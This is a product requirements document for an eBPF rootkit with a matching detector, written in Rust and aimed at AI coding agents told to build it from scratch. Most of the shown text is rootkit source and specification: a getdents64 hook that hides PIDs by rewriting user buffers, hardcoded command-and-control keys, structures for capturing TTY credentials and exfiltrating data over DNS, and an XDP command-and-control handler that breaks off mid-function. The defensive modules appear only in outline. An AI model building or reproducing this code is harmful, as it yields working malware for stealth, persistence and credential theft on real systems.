# PROJECT AEGIS-SHADOW: Complete Product Requirements Document
## eBPF Offensive Rootkit & Defensive Runtime Security Shield

> **PURPOSE**: This document is a complete, self-contained PRD for AI coding agents (Claude Code, GitHub Copilot, Cursor, etc.) to implement the entire project from scratch. Every file, struct, dependency, and logic path is specified. Follow the implementation order in Section 12.

---

## Table of Contents
1. [Project Metadata & Scope](#1-project-metadata--scope)
2. [Instructions for AI Agents](#2-instructions-for-ai-agents)
3. [Environment Setup](#3-environment-setup)
4. [Workspace Architecture](#4-workspace-architecture)
5. [Shared Crate: `common`](#5-shared-crate-common)
6. [Offensive Module: Shadow](#6-offensive-module-shadow)
7. [Defensive Module: Aegis](#7-defensive-module-aegis)
8. [Build System & Automation](#8-build-system--automation)
9. [CLI Design](#9-cli-design)
10. [Testing & Verification Plan](#10-testing--verification-plan)
11. [Dependency Manifest](#11-dependency-manifest)
12. [Implementation Order for AI Agents](#12-implementation-order-for-ai-agents)
13. [Safety & Ethics](#13-safety--ethics)
14. [README.md Content](#14-readmemd-content)

---

## 1. Project Metadata & Scope

| Field | Value |
|---|---|
| **Project Name** | Aegis-Shadow |
| **Subtitle** | Dual-Path eBPF Research: Programmable Rootkits vs. Runtime Observability Shields |
| **Language** | Rust (nightly toolchain) |
| **eBPF Framework** | Aya (pure Rust, no C dependencies) |
| **Target OS** | Linux Kernel 6.8+ (Ubuntu 24.04 LTS in VM) |
| **Host OS** | macOS (Apple Silicon or Intel) via UTM/QEMU |
| **Architecture** | x86_64 (VM guest) or aarch64 |

### In Scope
- 13 offensive eBPF features (process hiding, network stealth, file obfuscation, telemetry muting, persistence, credential harvesting, log tampering, process ancestry spoofing, DNS exfiltration, kallsyms hiding, anti-detach self-defense, encrypted C2, timestomping)
- 3 defensive detection modules (ghost map audit, syscall latency monitor, bytecode integrity checker)
- Emergency kill-switch mechanism for safe rootkit teardown
- HMAC-authenticated C2 channel (research-grade shared secret)
- `--dry-run` flag on offense binary for safe testing without loading eBPF
- Privilege validation (root / `CAP_BPF` + `CAP_PERFMON`) before eBPF operations
- Shared data structures crate
- Build automation via `xtask` pattern + Makefile + `build.rs` for eBPF bytecode embedding
- CLI interface for both offense and defense binaries
- End-to-end test plan (manual + automated `#[cfg(test)]` integration tests)

### Out of Scope
- Production deployment, CI/CD pipelines
- GUI or web dashboard
- Multi-OS support (Linux-only)
- Kubernetes integration (future work)
- AI/ML behavioral baselining (future work)

---

## 2. Instructions for AI Agents

### How to Read This Document
1. **Section 12 is your task list.** Follow it in exact order. Each step references the relevant section for details.
2. **Code blocks are real code** — copy them directly. Comments marked `// TODO: IMPLEMENT` are where you write logic.
3. **Do NOT skip error handling.** Use `anyhow::Result` in user-space. Use `Result<(), i64>` in eBPF.
4. **Do NOT add features not listed here.** No extra logging, no extra CLI flags, no refactoring.

### Conventions
- All eBPF structs: `#[repr(C)]`, `#[derive(Clone, Copy)]`
- User-space async runtime: `tokio` (multi-thread)
- CLI framework: `clap` v4 with derive macros
- Error handling: `anyhow` in user-space, raw `Result` in eBPF
- Logging: `aya-log` (eBPF) + `env_logger` (user-space)
- All BPF maps: defined in eBPF crate, accessed from user-space via Aya's map API
- `unsafe` blocks: required for kernel buffer manipulation — add `// SAFETY:` comments explaining why

### When to Proceed vs. Ask
- **Proceed**: If the PRD specifies the exact approach.
- **Ask**: If a kernel API is unavailable on the target kernel version, or if compilation fails due to Aya API changes.

### Critical Safety Checks
- Both binaries MUST validate they are running with sufficient privileges (`geteuid() == 0` or `CAP_BPF`) before attempting any eBPF operations. Print a clear error message and exit non-zero on failure.
- The offense binary MUST support `--dry-run` which logs all operations without loading eBPF programs.
- The offense binary MUST implement a kill-switch (`shadow kill-switch`) that immediately detaches all eBPF programs, unpins all maps, and exits cleanly. This must work even if the loader process that originally loaded the programs has crashed.

---

## 3. Environment Setup

### 3.1 Virtual Machine Setup (macOS Host)

```bash
# Option A: UTM (recommended for Apple Silicon)
# Download UTM from https://mac.getutm.app/
# Create new VM:
#   - Architecture: x86_64 (or ARM64 for M-series)
#   - RAM: 4GB minimum, 8GB recommended
#   - Disk: 40GB
#   - Network: Host-Only (CRITICAL: isolate from real network)
#   - ISO: Ubuntu 24.04 LTS Server

# Option B: QEMU (command line)
qemu-system-x86_64 \
  -m 4096 \
  -smp 4 \
  -enable-kvm \
  -drive file=aegis-shadow.qcow2,format=qcow2 \
  -cdrom ubuntu-24.04-live-server-amd64.iso \
  -net nic -net user,hostfwd=tcp::2222-:22
```

### 3.2 Guest OS Configuration (Run inside VM)

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install system dependencies
sudo apt install -y \
  build-essential \
  pkg-config \
  libelf-dev \
  clang \
  llvm \
  linux-tools-common \
  linux-tools-$(uname -r) \
  bpftool \
  git \
  curl

# Verify kernel BTF support (REQUIRED for CO-RE)
ls /sys/kernel/btf/vmlinux
# Expected: file exists. If not, install linux-image with BTF:
# sudo apt install linux-image-$(uname -r)-dbgsym

# Verify kernel version
uname -r
# Expected: 6.8.x or higher

# Verify BPF support
sudo bpftool feature probe kernel | grep -i "bpf"
# Expected: Multiple "is available" lines
```

### 3.3 Rust Toolchain Installation (Run inside VM)

```bash
# Install Rust via rustup
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
source "$HOME/.cargo/env"

# Install nightly toolchain (required for eBPF)
rustup toolchain install nightly
rustup default nightly

# Add BPF target
rustup target add x86_64-unknown-linux-gnu
# For ARM64 VMs: rustup target add aarch64-unknown-linux-gnu

# Install required cargo tools
cargo install bpf-linker
cargo install cargo-generate

# Verify installation
rustc --version   # Expected: rustc 1.XX.0-nightly
cargo --version
bpf-linker --version
```

### 3.4 Environment Verification Script

```bash
#!/bin/bash
# save as verify-env.sh, run with: bash verify-env.sh
echo "=== Aegis-Shadow Environment Check ==="
echo -n "Kernel version: " && uname -r
echo -n "BTF support: " && (ls /sys/kernel/btf/vmlinux 2>/dev/null && echo "OK" || echo "MISSING")
echo -n "Rust: " && rustc --version 2>/dev/null || echo "MISSING"
echo -n "bpf-linker: " && bpf-linker --version 2>/dev/null || echo "MISSING"
echo -n "bpftool: " && which bpftool 2>/dev/null || echo "MISSING"
echo -n "clang: " && clang --version 2>/dev/null | head -1 || echo "MISSING"
echo -n "libelf: " && pkg-config --exists libelf && echo "OK" || echo "MISSING"
echo "=== All checks complete ==="
```

---

## 4. Workspace Architecture

### 4.1 Complete Directory Tree

```
aegis-shadow/
├── Cargo.toml                    # Workspace root
├── .cargo/
│   └── config.toml               # Build configuration for BPF targets
├── Makefile                      # Convenience build targets
├── verify-env.sh                 # Environment verification script
├── README.md                     # Project overview
├── common/
│   ├── Cargo.toml
│   └── src/
│       └── lib.rs                # Shared structs and constants
├── offense/
│   ├── Cargo.toml
│   ├── build.rs                  # eBPF build trigger for include_bytes_aligned!
│   └── src/
│       └── main.rs               # User-space rootkit loader
├── offense-ebpf/
│   ├── Cargo.toml
│   └── src/
│       └── main.rs               # Kernel-space rootkit programs
├── defense/
│   ├── Cargo.toml
│   ├── build.rs                  # eBPF build trigger for include_bytes_aligned!
│   └── src/
│       ├── main.rs               # User-space detection engine
│       ├── ghost_map_audit.rs    # Module 1: Ghost Map detection
│       ├── integrity_check.rs    # Module 3: Bytecode auditing + hook audit
│       ├── hidden_process_detector.rs  # Module 4: Hidden process detection
│       └── net_audit.rs          # Module 5: Network attachment auditor
├── defense-ebpf/
│   ├── Cargo.toml
│   └── src/
│       └── main.rs               # Kernel-space defensive probes
├── tools/
│   └── c2_sender.py              # C2 command sender (Python, for testing)
└── xtask/
    ├── Cargo.toml
    └── src/
        └── main.rs               # Build automation (cargo xtask)
```

### 4.2 Root Cargo.toml

```toml
[workspace]
resolver = "2"
members = [
    "common",
    "offense",
    "offense-ebpf",
    "defense",
    "defense-ebpf",
    "xtask",
]

[workspace.dependencies]
anyhow = "1"
clap = { version = "4", features = ["derive"] }
env_logger = "0.11"
log = "0.4"
tokio = { version = "1", features = ["full"] }
```

### 4.3 .cargo/config.toml

```toml
[alias]
xtask = "run --package xtask --"

[build]
target-dir = "target"

# Unstable features needed for eBPF builds
[unstable]
build-std = ["core"]
```

---

## 5. Shared Crate: `common`

### 5.1 common/Cargo.toml

```toml
[package]
name = "common"
version = "0.1.0"
edition = "2021"

[features]
default = []
user = ["aya"]
kernel = []

[dependencies]
aya = { version = "~0.13", optional = true }

[lib]
path = "src/lib.rs"
```

### 5.2 common/src/lib.rs

```rust
#![no_std]
// When building for user-space, std is available via the `user` feature.
// When building for kernel (eBPF), we stay no_std.

/// Maximum number of PIDs that can be hidden simultaneously.
pub const MAX_HIDDEN_PIDS: u32 = 64;

/// Maximum entries in the command map.
pub const MAX_COMMANDS: u32 = 16;

/// Maximum number of TTY file descriptors to monitor for credential harvesting.
pub const MAX_TTY_FDS: u32 = 128;

/// Maximum DNS exfiltration chunk size in bytes (fits in a DNS label).
pub const DNS_EXFIL_CHUNK_SIZE: usize = 63;

/// Spoofed parent PID to use for ancestry spoofing (init process).
pub const SPOOFED_PPID: u32 = 1;

/// ChaCha20 nonce size in bytes.
pub const CHACHA20_NONCE_LEN: usize = 12;

/// ChaCha20 key for encrypted C2 (research-grade, 256-bit).
pub const C2_CHACHA20_KEY: [u8; 32] = [
    0x41, 0x45, 0x47, 0x49, 0x53, 0x2D, 0x53, 0x48,
    0x41, 0x44, 0x4F, 0x57, 0x2D, 0x43, 0x48, 0x41,
    0x43, 0x48, 0x41, 0x32, 0x30, 0x2D, 0x4B, 0x45,
    0x59, 0x2D, 0x30, 0x30, 0x30, 0x30, 0x30, 0x31,
]; // "AEGIS-SHADOW-CHACHA20-KEY-000001"

/// Magic bytes used to identify C2 packets in XDP.
/// The XDP program checks the first 4 bytes of UDP payload against this.
pub const MAGIC_BYTES: [u8; 4] = [0xDE, 0xAD, 0xBE, 0xEF];

/// Default UDP port for C2 communication.
pub const C2_PORT: u16 = 53; // Disguised as DNS

/// HMAC shared secret for C2 authentication (research-grade).
/// In a real scenario this would be derived from a key exchange.
/// The XDP program validates the HMAC before accepting any C2 command.
pub const C2_HMAC_KEY: [u8; 16] = [
    0x41, 0x45, 0x47, 0x49, 0x53, 0x2D, 0x53, 0x48,
    0x41, 0x44, 0x4F, 0x57, 0x4B, 0x45, 0x59, 0x31,
]; // "AEGIS-SHADOWKEY1"

/// HMAC digest length appended to C2 packets.
pub const C2_HMAC_LEN: usize = 16; // Truncated HMAC-SHA256

/// BPF pin path for persistence.
pub const BPF_PIN_PATH: &str = "/sys/fs/bpf/shadow";

/// Latency threshold multiplier for defense (1.3 = 30% above baseline).
/// NOTE: This constant is for user-space reference only. The eBPF program
/// uses integer math (multiply by 13, divide by 10) since floating-point
/// is unavailable in kernel BPF. If you change this value, update the
/// integer math in defense-ebpf/src/main.rs accordingly.
pub const LATENCY_THRESHOLD_MULTIPLIER: f64 = 1.3;

/// Baseline calibration duration in seconds.
pub const BASELINE_DURATION_SECS: u64 = 10;

// ──────────────────────────────────────────────
// Shared Structures (used by both eBPF and user-space)
// ──────────────────────────────────────────────

/// Configuration for the rootkit, stored in a BPF HashMap.
/// Key: 0 (singleton). Value: this struct.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct RootkitConfig {
    /// PID of the rootkit loader process (to self-exclude from hooks).
    pub self_pid: u32,
    /// Whether process hiding is active.
    pub hide_procs: u8,
    /// Whether network stealth is active.
    pub net_stealth: u8,
    /// Whether file obfuscation is active.
    pub file_obfuscate: u8,
    /// Whether telemetry muting is active.
    pub mute_telemetry: u8,
    /// Padding for alignment.
    pub _pad: [u8; 4],
}

/// Payload received via XDP C2 channel.
/// Extracted from UDP packets matching MAGIC_BYTES.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct CommandPayload {
    /// Command type: 1=hide_pid, 2=unhide_pid, 3=obfuscate_file, 4=exfil, 5=kill_switch
    pub cmd_type: u32,
    /// Argument (e.g., PID to hide, or first 4 bytes of filename hash).
    pub arg1: u32,
    /// Secondary argument.
    pub arg2: u32,
    /// Padding.
    pub _pad: u32,
}

/// Unified event header for both offense and defense reporting.
/// Sent from eBPF to user-space via PerfEventArray or RingBuf.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct EventHeader {
    /// Event type (see EventType constants below).
    pub event_type: u32,
    /// PID that triggered the event.
    pub pid: u32,
    /// Timestamp in nanoseconds (from bpf_ktime_get_ns).
    pub timestamp_ns: u64,
    /// Additional context (meaning depends on event_type).
    pub context: u64,
}

// Event type constants
pub const EVENT_PROC_HIDDEN: u32 = 1;
pub const EVENT_PACKET_INTERCEPTED: u32 = 2;
pub const EVENT_FILE_OBFUSCATED: u32 = 3;
pub const EVENT_TELEMETRY_MUTED: u32 = 4;
pub const EVENT_PERSISTENCE_SET: u32 = 5;
pub const EVENT_KILL_SWITCH: u32 = 6;
pub const EVENT_C2_AUTH_FAILED: u32 = 7;
pub const EVENT_CRED_CAPTURED: u32 = 8;
pub const EVENT_LOG_TAMPERED: u32 = 9;
pub const EVENT_ANCESTRY_SPOOFED: u32 = 10;
pub const EVENT_DNS_EXFIL: u32 = 11;
pub const EVENT_KALLSYMS_HIDDEN: u32 = 12;
pub const EVENT_ANTI_DETACH: u32 = 13;
pub const EVENT_TIMESTOMPED: u32 = 14;

// Defense event types (100+)
pub const EVENT_GHOST_MAP_FOUND: u32 = 100;
pub const EVENT_LATENCY_ANOMALY: u32 = 101;
pub const EVENT_DANGEROUS_HELPER: u32 = 102;
pub const EVENT_UNAUTHORIZED_HOOK: u32 = 103;
pub const EVENT_HIDDEN_PROCESS: u32 = 104;
pub const EVENT_ROGUE_NET_ATTACH: u32 = 105;

/// Syscall identifiers for multi-syscall latency monitoring.
pub const SYSCALL_GETDENTS64: u32 = 0;
pub const SYSCALL_READ: u32 = 1;
pub const SYSCALL_WRITE: u32 = 2;
pub const SYSCALL_GETATTR: u32 = 3;
pub const SYSCALL_SYSLOG: u32 = 4;

/// Alert structure used by the defense module.
/// Sized at 48 bytes to fit eBPF perf event constraints.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct DefenseAlert {
    /// Alert type from EVENT_* constants (100+).
    pub alert_type: u32,
    /// Severity: 1=info, 2=warning, 3=critical.
    pub severity: u32,
    /// Related BPF program ID (if applicable).
    pub prog_id: u32,
    /// Related BPF map ID (if applicable).
    pub map_id: u32,
    /// Syscall that triggered the alert (SYSCALL_* constants), or 0.
    pub syscall_id: u32,
    /// BPF helper ID that was flagged (for integrity alerts), or 0.
    pub helper_id: u32,
    /// Measured latency in nanoseconds (for latency alerts).
    pub latency_ns: u64,
    /// Baseline latency in nanoseconds (for comparison).
    pub baseline_ns: u64,
    /// Related PID (for hidden-process alerts), or 0.
    pub related_pid: u32,
    /// Padding for 8-byte alignment.
    pub _pad: u32,
}

/// Latency measurement stored in PerCpuHashMap.
/// Key: composite key encoding tgid + syscall_id.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct LatencyEntry {
    /// Timestamp when syscall entered (bpf_ktime_get_ns).
    pub entry_ns: u64,
    /// Which syscall this entry tracks (SYSCALL_* constant).
    pub syscall_id: u32,
    /// Padding.
    pub _pad: u32,
}

/// Rate-limiter state per CPU for defense alerts.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct RateLimitEntry {
    /// Timestamp of the last alert emitted (bpf_ktime_get_ns).
    pub last_alert_ns: u64,
}

/// Configuration for defense latency threshold, writable from user-space.
/// Key: 0 (singleton). Value: this struct.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct ThresholdConfig {
    /// Threshold numerator (default 13 = 130% of baseline, i.e., 30% above).
    pub numerator: u32,
    /// Threshold denominator (default 10).
    pub denominator: u32,
}

/// Minimum interval between alerts per-CPU in nanoseconds.
/// Default: 100ms = 100_000_000ns.
pub const ALERT_RATE_LIMIT_NS: u64 = 100_000_000;

/// Credential capture event sent from eBPF to user-space.
/// Contains a fragment of captured keystroke/write data from TTY devices.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct CredentialCapture {
    /// PID of the process writing to TTY.
    pub pid: u32,
    /// File descriptor being written to.
    pub fd: u32,
    /// Number of valid bytes in `data`.
    pub data_len: u32,
    /// Padding.
    pub _pad: u32,
    /// Captured data (up to 64 bytes per event).
    pub data: [u8; 64],
}

/// DNS exfiltration request. User-space populates this map,
/// and the TC eBPF program encodes the data into DNS query labels.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct DnsExfilChunk {
    /// Chunk sequence number.
    pub seq: u32,
    /// Number of valid bytes in `data`.
    pub data_len: u32,
    /// Data to exfiltrate (encoded as hex in DNS labels).
    pub data: [u8; 64],
}

/// Timestamp override entry for timestomping.
/// Key: inode number (u64). Value: this struct.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct TimestompEntry {
    /// Fake mtime in seconds since epoch.
    pub fake_mtime_sec: u64,
    /// Fake atime in seconds since epoch.
    pub fake_atime_sec: u64,
    /// Fake ctime in seconds since epoch.
    pub fake_ctime_sec: u64,
}

// ──────────────────────────────────────────────
// Safety: All structs above are plain-old-data (POD) types.
// They contain no pointers, no references, and no Drop impls.
// They are safe to transmit between kernel and user-space via BPF maps.
// ──────────────────────────────────────────────

#[cfg(feature = "user")]
unsafe impl aya::Pod for RootkitConfig {}

#[cfg(feature = "user")]
unsafe impl aya::Pod for CommandPayload {}

#[cfg(feature = "user")]
unsafe impl aya::Pod for EventHeader {}

#[cfg(feature = "user")]
unsafe impl aya::Pod for DefenseAlert {}

#[cfg(feature = "user")]
unsafe impl aya::Pod for LatencyEntry {}

#[cfg(feature = "user")]
unsafe impl aya::Pod for RateLimitEntry {}

#[cfg(feature = "user")]
unsafe impl aya::Pod for ThresholdConfig {}

#[cfg(feature = "user")]
unsafe impl aya::Pod for CredentialCapture {}

#[cfg(feature = "user")]
unsafe impl aya::Pod for DnsExfilChunk {}

#[cfg(feature = "user")]
unsafe impl aya::Pod for TimestompEntry {}
```

---

## 6. Offensive Module: Shadow

### 6.1 offense-ebpf/Cargo.toml

```toml
[package]
name = "offense-ebpf"
version = "0.1.0"
edition = "2021"

[dependencies]
aya-ebpf = "~0.1"
aya-log-ebpf = "~0.1"
common = { path = "../common", default-features = false, features = ["kernel"] }

[[bin]]
name = "offense"
path = "src/main.rs"

[profile.release]
lto = true
panic = "abort"
opt-level = 2      # Required: eBPF verifier rejects unoptimized code
debug = false
strip = "none"      # BPF needs symbols
```

### 6.2 offense-ebpf/src/main.rs — Complete eBPF Programs

```rust
#![no_std]
#![no_main]

use aya_ebpf::{
    bindings::xdp_action,
    macros::{kprobe, kretprobe, map, xdp},
    maps::{HashMap, PerfEventArray},
    programs::{ProbeContext, XdpContext},
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel, bpf_probe_write_user},
};
use aya_log_ebpf::info;
use common::{
    RootkitConfig, CommandPayload, EventHeader,
    MAGIC_BYTES, EVENT_PROC_HIDDEN, EVENT_PACKET_INTERCEPTED,
    EVENT_FILE_OBFUSCATED, EVENT_CRED_CAPTURED, EVENT_LOG_TAMPERED,
    EVENT_ANCESTRY_SPOOFED, EVENT_DNS_EXFIL, EVENT_KALLSYMS_HIDDEN,
    EVENT_ANTI_DETACH, EVENT_TIMESTOMPED, EVENT_C2_AUTH_FAILED,
    CredentialCapture, DnsExfilChunk, TimestompEntry,
    C2_CHACHA20_KEY, CHACHA20_NONCE_LEN,
};
use core::mem;

// ──────────────────────────────────────────────
// BPF Maps
// ──────────────────────────────────────────────

/// Stores PIDs to hide. Key: PID (u32), Value: 1 (u8, dummy marker).
#[map]
static HIDDEN_PIDS: HashMap<u32, u8> = HashMap::with_max_entries(64, 0);

/// Rootkit configuration. Key: 0 (u32, singleton). Value: RootkitConfig.
#[map]
static CONFIG: HashMap<u32, RootkitConfig> = HashMap::with_max_entries(1, 0);

/// Events sent to user-space loader.
#[map]
static EVENTS: PerfEventArray<EventHeader> = PerfEventArray::new(0);

/// Temporary storage for getdents64 return buffer pointer.
/// Key: tgid (u64). Value: buffer pointer (u64).
#[map]
static GETDENTS_BUFS: HashMap<u64, u64> = HashMap::with_max_entries(1024, 0);

/// Temporary storage for getdents64 return value (bytes read).
/// Key: tgid (u64). Value: bytes_read (i64).
#[map]
static GETDENTS_RETS: HashMap<u64, i64> = HashMap::with_max_entries(1024, 0);

/// TTY file descriptors to monitor for credential harvesting.
/// Key: major:minor device number (u64). Value: 1 (marker).
#[map]
static MONITORED_TTYS: HashMap<u64, u8> = HashMap::with_max_entries(128, 0);

/// Credential capture events sent to user-space.
#[map]
static CRED_EVENTS: PerfEventArray<CredentialCapture> = PerfEventArray::new(0);

/// PIDs whose parent PID should be spoofed.
/// Key: PID (u32). Value: fake PPID (u32).
#[map]
static SPOOFED_PPIDS: HashMap<u32, u32> = HashMap::with_max_entries(64, 0);

/// DNS exfiltration queue. User-space writes chunks, TC program reads them.
/// Key: sequence number (u32). Value: DnsExfilChunk.
#[map]
static DNS_EXFIL_QUEUE: HashMap<u32, DnsExfilChunk> = HashMap::with_max_entries(64, 0);

/// Shadow program IDs to protect from detachment.
/// Key: BPF program ID (u32). Value: 1 (marker).
#[map]
static PROTECTED_PROG_IDS: HashMap<u32, u8> = HashMap::with_max_entries(32, 0);

/// Inodes whose timestamps should be faked.
/// Key: inode number (u64). Value: TimestompEntry.
#[map]
static TIMESTOMP_INODES: HashMap<u64, TimestompEntry> = HashMap::with_max_entries(64, 0);

/// Patterns to suppress in kernel log output (hashes of strings to hide).
/// Key: hash of pattern (u64). Value: 1 (marker).
#[map]
static LOG_SUPPRESS_PATTERNS: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

/// Unified vfs_read context for kretprobe dispatch (Features 3, 8, 10).
/// Stored on kprobe entry, consumed by the appropriate kretprobe.
/// Key: pid_tgid (u64). Value: VfsReadCtx.
#[repr(C)]
struct VfsReadCtx {
    buf_ptr: u64,
    inode: u64,
    count: u64,
}

#[map]
static VFS_READ_ARGS: HashMap<u64, VfsReadCtx> = HashMap::with_max_entries(1024, 0);

// ──────────────────────────────────────────────
// FEATURE 1: Process Hiding (getdents64)
// ──────────────────────────────────────────────
//
// Strategy:
// 1. kprobe on sys_getdents64: capture the user-space buffer pointer.
// 2. kretprobe on sys_getdents64: iterate linux_dirent64 entries in the
//    returned buffer. For each entry, parse d_name as a PID. If the PID
//    is in HIDDEN_PIDS, modify the *previous* entry's d_reclen to skip
//    over the hidden entry.
//
// linux_dirent64 layout:
//   struct linux_dirent64 {
//       ino64_t        d_ino;       // 8 bytes
//       off64_t        d_off;       // 8 bytes
//       unsigned short d_reclen;    // 2 bytes (offset 16)
//       unsigned char  d_type;      // 1 byte  (offset 18)
//       char           d_name[];    // variable (offset 19)
//   };
//
// The d_reclen field at offset 16 tells how many bytes to skip to reach
// the next entry. By increasing the previous entry's d_reclen, we make
// the kernel "jump over" the hidden entry.

/// Kernel entry: capture buffer pointer argument.
#[kprobe]
pub fn shadow_getdents64_enter(ctx: ProbeContext) -> u32 {
    match try_getdents64_enter(&ctx) {
        Ok(ret) => ret,
        Err(_) => 0,
    }
}

fn try_getdents64_enter(ctx: &ProbeContext) -> Result<u32, i64> {
    // sys_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
    // Argument 1 (index 1) is the user-space buffer pointer.
    let buf_ptr: u64 = ctx.arg(1).ok_or(1i64)?;
    let tgid = bpf_get_current_pid_tgid();

    // Store buffer pointer for use in kretprobe
    GETDENTS_BUFS.insert(&tgid, &buf_ptr, 0).map_err(|_| 2i64)?;

    Ok(0)
}

/// Kernel return: iterate entries and hide matching PIDs.
#[kretprobe]
pub fn shadow_getdents64_exit(ctx: ProbeContext) -> u32 {
    match try_getdents64_exit(&ctx) {
        Ok(ret) => ret,
        Err(_) => 0,
    }
}

fn try_getdents64_exit(ctx: &ProbeContext) -> Result<u32, i64> {
    let tgid = bpf_get_current_pid_tgid();

    // Retrieve stored buffer pointer
    let buf_ptr = unsafe {
        GETDENTS_BUFS.get(&tgid).ok_or(1i64)?
    };
    let buf_ptr = *buf_ptr;

    // Clean up the temporary entry
    let _ = GETDENTS_BUFS.remove(&tgid);

    // Get return value (total bytes written to buffer)
    let ret_val: i64 = ctx.ret().ok_or(2i64)?;
    if ret_val <= 0 {
        return Ok(0);
    }
    let total_bytes = ret_val as u64;

    // RACE CONDITION GUARD: Validate the user-space buffer is still accessible.
    // Between kprobe entry and kretprobe exit, the target process could have
    // exited or unmapped the buffer. We do a small probe read first to verify
    // the buffer is still mapped before writing.
    let mut probe_byte: u8 = 0;
    let probe_result = unsafe {
        bpf_probe_read_kernel(
            &mut probe_byte as *mut u8 as *mut core::ffi::c_void,
            1,
            buf_ptr as *const core::ffi::c_void,
        )
    };
    if probe_result < 0 {
        // Buffer is no longer accessible — abort safely
        return Ok(0);
    }

    // Iterate through linux_dirent64 entries.
    // CRITICAL: eBPF verifier requires bounded loops. We cap at 128 iterations.
    let mut offset: u64 = 0;
    let mut prev_reclen_ptr: u64 = 0; // pointer to previous entry's d_reclen
    let mut prev_reclen_val: u16 = 0;

    // BPF verifier requires a bounded loop
    for _i in 0..128u32 {
        if offset >= total_bytes {
            break;
        }

        let entry_ptr = buf_ptr + offset;

        // Read d_reclen (2 bytes at offset 16 from entry start)
        let reclen_ptr = entry_ptr + 16;
        let d_reclen: u16 = unsafe {
            let mut val: u16 = 0;
            // SAFETY: reading from user-space buffer that kernel just wrote to
            if bpf_probe_read_kernel(
                &mut val as *mut u16 as *mut core::ffi::c_void,
                mem::size_of::<u16>() as u32,
                reclen_ptr as *const core::ffi::c_void,
            ) < 0 {
                break;
            }
            val
        };

        if d_reclen == 0 {
            break;
        }

        // Read d_name (starts at offset 19, read up to 16 bytes for PID parsing)
        let name_ptr = entry_ptr + 19;
        let mut d_name: [u8; 16] = [0u8; 16];
        unsafe {
            // SAFETY: reading directory entry name from kernel buffer
            if bpf_probe_read_kernel(
                d_name.as_mut_ptr() as *mut core::ffi::c_void,
                16,
                name_ptr as *const core::ffi::c_void,
            ) < 0 {
                offset += d_reclen as u64;
                continue;
            }
        };

        // Parse d_name as PID (ASCII digits to u32)
        let pid = parse_pid_from_name(&d_name);

        if pid > 0 {
            // Check if this PID should be hidden
            if unsafe { HIDDEN_PIDS.get(&pid).is_some() } {
                // HIDE THIS ENTRY:
                // Increase the *previous* entry's d_reclen to skip over this one.
                if prev_reclen_ptr != 0 {
                    let new_reclen = prev_reclen_val + d_reclen;
                    unsafe {
                        // SAFETY: writing to user-space buffer to hide the entry.
                        // This modifies the previous entry's d_reclen to jump over
                        // the current (hidden) entry.
                        let _ = bpf_probe_write_user(
                            prev_reclen_ptr as *mut core::ffi::c_void,
                            &new_reclen as *const u16 as *const core::ffi::c_void,
                            mem::size_of::<u16>() as u32,
                        );
                    }
                    // Update prev_reclen_val to reflect the merged length
                    prev_reclen_val = new_reclen;
                    // Do NOT update prev_reclen_ptr — it stays pointing at the
                    // previous (visible) entry, in case the next entry is also hidden.
                } else {
                    // First entry is the one to hide. We handle this by
                    // copying the *second* entry's data over the first entry
                    // position, effectively shifting the visible entries forward.
                    // However, in eBPF this is constrained by the verifier.
                    //
                    // WORKAROUND: Overwrite the first entry's d_name to make
                    // it a non-numeric name (e.g., "."), so user-space tools
                    // like `ps` will ignore it when parsing /proc.
                    let dot_name: [u8; 2] = [b'.', 0];
                    unsafe {
                        // SAFETY: Overwriting d_name at offset 19 in the first entry.
                        let _ = bpf_probe_write_user(
                            (entry_ptr + 19) as *mut core::ffi::c_void,
                            dot_name.as_ptr() as *const core::ffi::c_void,
                            2,
                        );
                    }
                    prev_reclen_ptr = reclen_ptr;
                    prev_reclen_val = d_reclen;
                }
                offset += d_reclen as u64;
                continue;
            }
        }

        // This entry is visible — update prev pointers
        prev_reclen_ptr = reclen_ptr;
        prev_reclen_val = d_reclen;
        offset += d_reclen as u64;
    }

    Ok(0)
}

/// Parse a directory entry name as a numeric PID.
/// Returns 0 if the name is not a valid PID (non-numeric).
#[inline(always)]
fn parse_pid_from_name(name: &[u8; 16]) -> u32 {
    let mut pid: u32 = 0;
    let mut i = 0usize;
    // BPF verifier: bounded loop over fixed-size array
    while i < 16 {
        let c = name[i];
        if c == 0 {
            break;
        }
        if c < b'0' || c > b'9' {
            return 0; // Not a numeric name, not a PID directory
        }
        pid = pid * 10 + (c - b'0') as u32;
        i += 1;
    }
    pid
}

// ──────────────────────────────────────────────
// FEATURE 2: Network Stealth (XDP)
// ──────────────────────────────────────────────
//
// Strategy:
// 1. Attach XDP program to the primary network interface.
// 2. Parse incoming packets: Ethernet → IP → UDP.
// 3. Check destination port matches C2_PORT.
// 4. If the UDP payload starts with MAGIC_BYTES, validate HMAC.
// 5. If HMAC is valid, this is an authenticated C2 command.
// 6. Drop the packet from the OS stack (XDP_DROP) so no firewall/IDS sees it.
// 7. Send a perf event to user-space with the command payload.
//
// Packet layout:
//   [Ethernet Header: 14 bytes]
//   [IP Header: 20 bytes (no options)]
//   [UDP Header: 8 bytes]
//   [Payload: MAGIC_BYTES (4) + CommandPayload (16) + HMAC (16)]

const ETH_HDR_LEN: usize = 14;
const IP_HDR_LEN: usize = 20;
const UDP_HDR_LEN: usize = 8;
const ETH_P_IP: u16 = 0x0800;
const IPPROTO_UDP: u8 = 17;

#[xdp]
pub fn shadow_xdp(ctx: XdpContext) -> u32 {
    match try_shadow_xdp(&ctx) {
        Ok(action) => action,
        Err(_) => xdp_action::XDP_PASS, // On error, pass packet through
    }
}

fn try_shadow_xdp(ctx: &XdpContext) -> Result<u32, i64> {
    let data = ctx.data();
    let data_end = ctx.data_end();

